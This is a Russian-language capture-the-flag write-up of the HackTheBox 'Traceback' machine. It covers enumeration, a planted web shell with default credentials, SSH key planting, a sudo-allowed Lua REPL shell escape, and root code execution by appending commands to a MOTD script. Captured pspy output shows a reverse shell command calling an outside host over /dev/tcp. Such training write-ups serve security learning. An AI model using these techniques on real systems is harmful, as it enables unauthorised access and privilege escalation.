# Traceback
## HTB machine

- Название: Traceback  
- OS: Linux
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 14.03.20

## Write-up

```html
┌─[✗]─[user@parrot]─[~/Downloads]
└──╼ $nmap -p- -A 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 05:15 AKDT
Nmap scan report for 10.10.10.181
Host is up (0.079s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 264.34 seconds
```

>Классический результат. В директориях тоже ничего:

```html
┌─[root@parrot]─[/home/user/Downloads]
└──╼ #gobuster dir --url http://10.10.10.181/ --wordlist /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.181/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/08 05:24:34 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/08 05:25:37 Finished
===============================================================

┌─[root@parrot]─[/home/user/Downloads]
└──╼ #dirb http://10.10.10.181/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May  8 05:27:44 2020
URL_BASE: http://10.10.10.181/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.181/ ----
+ http://10.10.10.181/index.html (CODE:200|SIZE:1113)                                        
+ http://10.10.10.181/nc (CODE:200|SIZE:35520)                                               
+ http://10.10.10.181/server-status (CODE:403|SIZE:300)                                      
                                                                                             
-----------------
END_TIME: Fri May  8 05:38:56 2020
DOWNLOADED: 4612 - FOUND: 3
```

>На самом сайте говорится о том, что его уже взломали и предоставили доступ всему интернету. Намек на следующий шаг можно увидеть в исходнике главной страницы:

>-- Some of the best web shells that you might need --

>Если загуглить эту фразу, можно сразу наткнуться на репозитории создателя машины, там собраны веб-шеллы. И так как сайт уже якобы взломан, один из этих шеллов валяется где то на сервере. Можно конечно автоматизировать процесс, но я и так быстро нашел нужный:

```html
----------------
Репозитории
https://github.com/TheBinitGhimire/Web-Shells
----------------
Название шелла
smevk.php
----------------
Его расположение
http://10.10.10.181/smevk.php
----------------
Содержимое шелла 
$UserName = "admin";
$auth_pass = "admin";                                  
----------------
```

>При входе нас встречает отвратительный фиолетовый и перекошенные кнопки, порывшись в этом, можно заметить что директория .ssh доступна для редактирования, то есть можно закинуть authorized_keys и залогиниться по ssh, чтобы не видеть больше этого дИзАйНа:

>Создаем ключи с помощью ssh-keygen, заходим в .ssh и перекидываем с помощью утилиты wget публичный ключ, заранее переименованный в authorized_keys, логинимся:

```html
┌─[✗]─[root@parrot]─[~/.ssh]
└──╼ #ssh webadmin@10.10.10.181
The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key '/root/.ssh/id_rsa': 

Welcome to Xh4H land 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May  8 06:36:52 2020 from 10.10.14.10
webadmin@traceback:~$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

>Создатель машины Xh4H не устает о себе напоминать, идем дальше:

```html
webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

>Проверим разрешения:

```html
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

>В корневом каталоге юзера лежат файлы с расширением lua, языка программирования:

>И один из них явно намекает:

```html
webadmin@traceback:~$ cat chocho.lua 
os.execute("/bin/sh")
```

>Несложной командой совершаем горизонтальную эскалацию:

```html
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/sh -i")
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
```

>И берем флаг юзера:

```html
$ cd ..
$ ls
sysadmin  webadmin
$ cd sysadmin
$ ls
luvit  test.lua  user.txt
$ cat user.txt
7f0b9c6e3bd8a432ddd4a1**********
```

>Не ясно, что делать дальше, поэтому пока просто понаблюдаем за тем, что крутится в системе с помощью pspy:

```html
$ wget http://10.10.14.58:8000/pspy64
--2020-05-08 07:25:34--  http://10.10.14.58:8000/pspy64
Connecting to 10.10.14.58:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                  100%[=============================>]   2.94M   821KB/s    in 4.5s    

2020-05-08 07:25:39 (661 KB/s) - ‘pspy64’ saved [3078592/3078592]
```

>Делаем файл исполняемым и запускаем:

```html
$ chmod +X ./pspy64
$ ls
luvit  pspy64  test.lua  user.txt
$ ./pspy64
```

>Я вырезал большую часть скана и оставил интересную:

```html
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/05/08 07:29:01 CMD: UID=0    PID=24381  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/05/08 07:29:01 CMD: UID=0    PID=24380  | <mark>/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/</mark>
2020/05/08 07:29:10 CMD: UID=1000 PID=24384  | sudo -u sysadmin /home/sysadmin/luvit lmao.lau 
2020/05/08 07:29:10 CMD: UID=1001 PID=24385  | /home/sysadmin/luvit lmao.lau 
2020/05/08 07:29:18 CMD: UID=1001 PID=24390  | nano /etc/update-motd.d/00-header 
2020/05/08 07:29:30 CMD: UID=1001 PID=24439  | nano /etc/update-motd.d/00-header 
2020/05/08 07:29:35 CMD: UID=1000 PID=24445  | 
2020/05/08 07:29:35 CMD: UID=1000 PID=24446  | 
2020/05/08 07:29:41 CMD: UID=1001 PID=24450  | nano /etc/update-motd.d/00-header 
2020/05/08 07:29:43 CMD: UID=0    PID=24451  | 
2020/05/08 07:29:44 CMD: UID=1000 PID=24452  | locate note.txt 
2020/05/08 07:29:47 CMD: UID=1001 PID=24453  | bash -c exec bash -i &>/dev/tcp/10.10.15.245/6001 <&1 
2020/05/08 07:29:47 CMD: UID=1001 PID=24457  | /bin/sh /usr/bin/lesspipe 
2020/05/08 07:29:47 CMD: UID=1001 PID=24456  | bash -i 
2020/05/08 07:29:47 CMD: UID=1001 PID=24459  | /bin/sh /usr/bin/lesspipe 
2020/05/08 07:29:47 CMD: UID=1001 PID=24462  | dircolors -b 
2020/05/08 07:29:47 CMD: UID=1001 PID=24461  | bash -i 
2020/05/08 07:29:53 CMD: UID=1000 PID=24509  | sudo -u sysadmin /home/sysadmin/luvit lmao.lau 
2020/05/08 07:29:53 CMD: UID=1001 PID=24510  | /home/sysadmin/luvit lmao.lau 
2020/05/08 07:30:00 CMD: UID=1000 PID=24516  | sudo -l 
2020/05/08 07:30:01 CMD: UID=0    PID=24521  | sleep 30 
2020/05/08 07:30:01 CMD: UID=0    PID=24520  | /usr/sbin/CRON -f 
2020/05/08 07:30:01 CMD: UID=0    PID=24519  | <mark>/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ </mark>
2020/05/08 07:30:01 CMD: UID=0    PID=24518  | /usr/sbin/CRON -f 
2020/05/08 07:30:01 CMD: UID=0    PID=24517  | /usr/sbin/CRON -f 
^Z[1] + Stopped                    ./pspy64
```

>Каждые 30 секунд делается бэкап файлов из директории /var/backups/.update-motd.d/, но заюзать это я не смог, так как кто то ребутнул машину.

>При повторном получении юзера, я изменил файл privesc.lua, было:

```html
webadmin@traceback:~$ cat privesc.lua 
os.execute("/bin/sh")
```

>Стало:

```html
webadmin@traceback:~$ cat privesc.lua 
os.execute("/bin/bash")
```

>Далее повторяем прошлые действия и переходим в папку, куда делается бэкап:

```html
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
sysadmin@traceback:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
sysadmin@traceback:~$ cd /etc/update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ ls
00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland kirkland@canonical.com
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
```

>Последнюю строчку мы видели при входе в систему. Редактировать файл невозможно, но можко воспользоваться echo, я вписал "echo "id" >> 00-header" и при следующем входе в систему получил информацию о том, что команда выполняется от root пользователя, поэтому мы просто прочтем нужный нам файл:

```html
sysadmin@traceback:/etc/update-motd.d$ echo "cat /root/root.txt" >> 00-header 
sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland kirkland@canonical.com
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
cat /root/root.txt
```

>Важно успеть все сделать в течении 30 секунд, иначе файл замениться на исходный, поэтому сразу после этого выходим из системы или логинимся через другой терминал:

>И берем флаг:

```html
sysadmin@traceback:/etc/update-motd.d$ exit
exit
webadmin@traceback:~$ exit
logout
Connection to 10.10.10.181 closed.
┌─[root@parrot]─[~/.ssh]
└──╼ #ssh webadmin@10.10.10.181 -i id_rsa
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key 'id_rsa': 

Welcome to Xh4H land 

c39f1403ae15138c37751c**********

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 10 08:22:39 2020 from 10.10.14.89
```
